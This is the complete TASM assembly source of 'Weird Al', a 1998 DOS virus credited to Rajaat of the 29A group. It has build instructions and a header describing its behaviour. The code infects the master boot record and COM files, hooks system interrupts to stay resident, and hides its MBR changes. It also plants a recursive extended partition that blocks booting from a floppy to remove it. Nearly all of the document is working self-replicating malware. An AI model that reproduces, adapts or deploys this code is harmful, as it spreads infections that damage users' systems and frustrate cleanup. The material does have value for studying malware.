;=====( Weird Al Virus by Rajaat / 29A )=======================================
;
; Virus name    : Weird Al
; Author        : Rajaat / 29A
; Origin        : United Kingdom, March 1998
; Compiling     : Using TASM
;
;                 TASM /M WEIRDAL
;                 TLINK /T WEIRDAL
; Targets       : MBR & COM files
; Size          : 512 bytes
; Resident      : Yes, from MBR only (no TOM decrease)
; Polymorphic   : No
; Encrypted     : No
; Stealth       : MBR only, reads and write
; Tunneling     : Uses SFT to avoid some monitors
; Retrovirus    : Yes, it uses the recursive extended partition trick
; Antiheuristics: Not deliberately
; Peculiarities : Nothing, I think, it's been a little exercise for me
; Drawbacks     : Write me :-)
; Behaviour     : When an infected COM file is executed, the virus will try
;                 to immediately infect the MBR. If the virus already
;                 infected the MBR but is not resident yet, it will
;                 recognize itself by the two POP AX instructions at the
;                 start of the virus code. If the virus is resident the
;                 MBR stealth routine will take care and the MBR won't
;                 be re-infected. After that the virus simply returns
;                 control to the host. When started by booting from the
;                 MBR, the virus will load it's code starting from
;                 absolute sector 2, directly to the top of dos memory.
;                 The virus will then hook INT 13 and INT 2F. The virus
;                 will reload the MBR (which loads now the original one)
;                 and returns control to the normal boot process. The
;                 virus will reserve its memory when it gets its INT 2F
;                 handler called by IO.SYS. It will return the last free
;                 segment in DX and IO.SYS will make a memory block for
;                 the virus when it starts building the MCB chain. This
;                 way the top of dos memory won't be decreased as
;                 usually happens with boot sector viruses. Q also uses
;                 this routine. It's a feature built in DOS for Novell
;                 its Remote Program Loader (RPL) for diskless
;                 workstations. INT 13 has two functions in this virus.
;                 First, it will try to make detection and removal of
;                 the MBR infection somewhat more difficult by making it
;                 read/write stealth. Second, it will check if the UMB
;                 chain is set up by a memory manager. When this happens
;                 the virus will hook INT 21. When this is done, the
;                 virus will infect every COM file that is closed
;                 (copying/scanning) and executed. It will get the
;                 current System File Table (SFT) from the Dos Swappable
;                 Area (DSA, which I also use in the DSA viruses) and
;                 set the file mode to read/write. It will check if it
;                 is a valid COM file and if it hasn't been already
;                 infected. Cleaning this virus might be a bit of a
;                 hassle, since it isn't possible to boot from a floppy
;                 that has MS-DOS 4.0 or higher, because of the
;                 recursive extended partition and the wonderful
;                 implementation flaw in IO.SYS that handles assigning
;                 drive names to the partitions. Get IBMDOS or Caldera
;                 OpenDos (www.caldera.com) to boot from a floppy disk
;                 and get rid of this virus. Apart from these features,
;                 the virus ain't very remarkable, but was a nice
;                 programming exercise for me today.
;
;                 It's unknown what this virus might do besides replicate :)
;==============================================================================

.model tiny                                     ; PeeWee Herman
.code                                           ; Code starts here
.radix 16                                       ; You know I *LOVE* radix 16
.386                                            ; I don't shun 386 opcodes

                org 100                         ; Doh!

main:           pop ax ax                       ; Get PSP:0
                sub ax,20cdh                    ; Is it INT 20?
                jz com_entry                    ; Yes, goto com_entry

;=====( MBR entrypoint )=======================================================

                cli                             ; MBR code starts here
                xor ax,ax                       ;
                mov ds,ax                       ; Initialise segments
                mov ss,ax                       ; and stack
                mov sp,7c00                     ;
                sti
                int 12                          ; Get top of memory
                shl ax,6                        ; Convert to segment
                sub ax,virus_paras+11           ; Substruct virus paras (and
                mov es,ax                       ; UMB marker segment!)
                mov ax,0200+virus_sectors       ;
                mov bx,100                      ; Read virus code to TOM
                mov cx,2                        ;
                call write_virus                ; (Stupid labels)
                push cs                         ;
                push es                         ;
                lea ax,tom_ep                   ;
                push ax                         ;
                retf                            ; Jump to virus code below TOM

tom_ep:         mov ds,cx                       ; Antiheuristic?
                push dword ptr [ds:4*2f-20]     ;
                pop dword ptr [es:old_2f]       ; Hook INT 2F
                push es                         ;
                push offset new_2f              ;
                pop dword ptr [ds:4*2f-20]      ;

                push dword ptr [ds:4*13-20]     ;
                pop dword ptr [es:old_13]       ;
                push es                         ; Hook INT 13
                push offset new_13              ;
                pop dword ptr [ds:4*13-20]      ;

                xor ax,ax                       ; Set INT 21 hooked state to
                mov word ptr [es:old_21+2],ax   ; clean

                pop es                          ; Read original MBR and
                mov bx,7c00                     ; continue regular boot (the
                call read_mbr                   ; read is handled by the virus
                push es bx                      ; it's own stealth routine)
                retf                            ;

;=====( COM file entrypoint )==================================================

com_entry:      call get_delta                  ; Nothing new here
get_delta:      pop si                          ;
                sub si,offset get_delta         ;

                lea bx,virus_end[si]            ;
                call read_mbr                   ; Read MBR
                cmp word ptr ds:[si],5858       ; Already infected?
                jz mbr_infected                 ; Yes, goto mbr_infected

                mov ax,0301                     ; Infect MBR
                lea bx,main[si]                 ;
                call write_mbr                  ;

                mov ax,0301+virus_sectors       ; Write virus and original
                inc cx                          ; MBR to absolute sectors 2
                call write_virus                ; and 3

;=====( Return to COM host )===================================================

mbr_infected:   push ax ax                      ;
                lea si,host_bytes[si]           ; Restore original 4 bytes
                mov di,100                      ; and return to the host by
                push di                         ; pushing 100h to the stack
                movsd                           ; and doing a RET
                xor ax,ax                       ;
                ret                             ;

read_mbr:       mov ax,0201                     ; Multiple purpose routine
write_mbr:      mov cx,1                        ; for reading and writing
write_virus:    mov dx,80                       ; using INT 13
                int 13                          ;
                ret                             ;

;=====( INT 2F handler )=======================================================

reserve_memory: sub dx,virus_paras+1            ; Reserve memory for the
                iret                            ; virus (look story above)
new_2f:         jmp reserve_memory
                db ''                          ; Smile.

;=====( INT 13 handler )=======================================================

new_13:         db 'RPL'                        ; Check this out in DEBUG
                add sp,5                        ; don't we love antidebugging?
                cmp dl,80                       ; HD1?
                je is_hd                        ; Yes, goto is_hd
eoi_13:         db 0ea                          ; Bailout
old_13          dd 0
is_hd:          cmp cx,1000
                org $-2         ; very filthy thing to get rid of a turbo
                dw 1            ; assembler problem (check if abs sector 1)
                je is_mbr       ; Yes, it is the MBR they try to access
check_umb:      push ax es
                mov ax,9fff                     ;
                mov es,ax                       ;
                cmp word ptr [es:8],'CS'        ; UMB present?
                jnz no_umb                      ; No, let's wait
                xor ax,ax
                cmp word ptr [cs:old_21+2],ax   ; Already hooked?
                jnz no_umb                      ; Yes, bailout again
                mov es,ax
                push dword ptr [es:4*21]        ;
                pop dword ptr [cs:old_21]       ; No, now hook INT 21
                push cs                         ;
                push offset new_21              ;
                pop dword ptr [es:4*21]         ;

no_umb:         pop es ax
                jmp eoi_13

is_mbr:         or dh,dh                        ; Head 0?
                jnz check_umb                   ; No, it was not the MBR
                                                ; after all :-p
;=====( MBR stealth routine )==================================================

                cmp ah,2                        ; Read?
                je is_read                      ; Yes, goto is_read
                cmp ah,0a                       ; Long read?
                je is_read                      ; Yes, goto is_read
                cmp ah,3                        ; Write?
                jne eoi_13                      ; No, goto end of INT 13
                mov ah,4                        ; Yes, we change to write
is_read:        add cx,virus_sectors+1          ; Redirect to original MBR
                jmp eoi_13                      ; and proceed with original
                                                ; INT 13

;=====( INT 21 handler )=======================================================

new_21:         cmp ah,3e                       ; Close file?
                jz close_file                   ; Yes, goto close_file
                cmp ah,4bh
                jnz eoi_21
                push ax bx
                mov ah,3dh
                int 21
                xchg ax,bx
                mov ah,3e
                int 21
                pop bx ax
eoi_21:         db 0ea                          ; No, bailout to next INT 21
old_21          dd 0                            ; handler

close_file:     push eax cx dx si di ds es
                mov ax,5d06                     ; Get DSA
                int 21
                les di,ds:[si+27e]              ; Get current SFT
                test byte ptr es:[di+5],80      ; Is it a device?
                jnz is_infected                 ; Yes, we assume it's infected

;=====( Check extension )======================================================
                push cs                         ;
                pop ds                          ;

                mov eax,dword ptr es:[di+28]    ;
                or eax,dword ptr or_mask        ;
                and eax,00ffffff                ;
                cmp eax,'moc'                   ; COM?
                jne is_infected                 ; No, it's infected (N0T!)

                or byte ptr es:[di+2],2         ; File is now read/write
                and byte ptr es:[di+2],0fe      ; (except for Novell)

                call seek_start                 ; Go start of file

                mov ah,3f                       ; Read first 4 bytes of
                mov cx,4                        ; the file
                lea dx,host_bytes               ;
                int 21                          ;

                cmp word ptr host_bytes,'ZM'    ; I don't want to infect
                je is_infected                  ; misnamed files like
                                                ; COMMAND.COM of Winblows 95
                                                ; so I assume they are infected

                cmp byte ptr host_bytes+3,'['   ; Reinfections suck, so I
                je is_infected                  ; also check if it's infected
                                                ; already

                mov ax,4202                     ; Goto EOF
                call seek

                or dx,dx                        ; 64K+?
                jnz is_infected                 ; Yes, we infected is (I must
                                                ; make better labels sometime)

                cmp ax,0f000                    ; >F000 bytes?
                ja is_infected                  ; Yes, assume infected

                sub ax,3                        ; Calculate relative jump
                mov jump_address,ax             ;

                mov ah,40                       ;
                lea dx,main                     ; Write virus at end of file
                mov cx,virus_bytes              ;
                int 21                          ;
                jnc write_ok                    ; If no error, goto write_ok

                jmp is_infected                 ;

host_bytes      equ $
old_2f          dd 0abba20cdh                   ; Original host

                db '[Weird Al]'                 ; Weird Al Yankovic or
                                                ; Weird Artificial Life? ;-)

                org 2be                         ; ouch!

                db 080,000,001,000,005          ; Extended (severely fucked
or_mask:        db 020,020,020,020              ; fucked partition)

write_ok:       call seek_start                 ;
                mov ah,40                       ; Go to the start of the file
                lea dx,jumper                   ; and write the jump to the
                mov cx,4                        ; virus and infection marker
                int 21                          ;

                or byte ptr es:[di+6],4         ; Disallow file date/time

is_infected:    pop es ds di si dx cx eax
                jmp eoi_21

seek_start:     mov ax,4200                     ; Multiple purpose seek
seek:           xor cx,cx                       ; routine
                cwd                             ;
                int 21                          ;
                ret                             ;

jumper          db 0e9                          ; The jump for at the start of
jump_address    dw 0                            ; the COM file
signature       db '[ Rajaat/29A ]'             ; Guess who???

                org 2fe

                db 55,0aa                       ; MBR signature (needed!)

virus_end       equ $
virus_bytes     equ virus_end-main
virus_paras     equ (virus_bytes shr 4)
virus_sectors   equ (virus_bytes shr 9)

end main
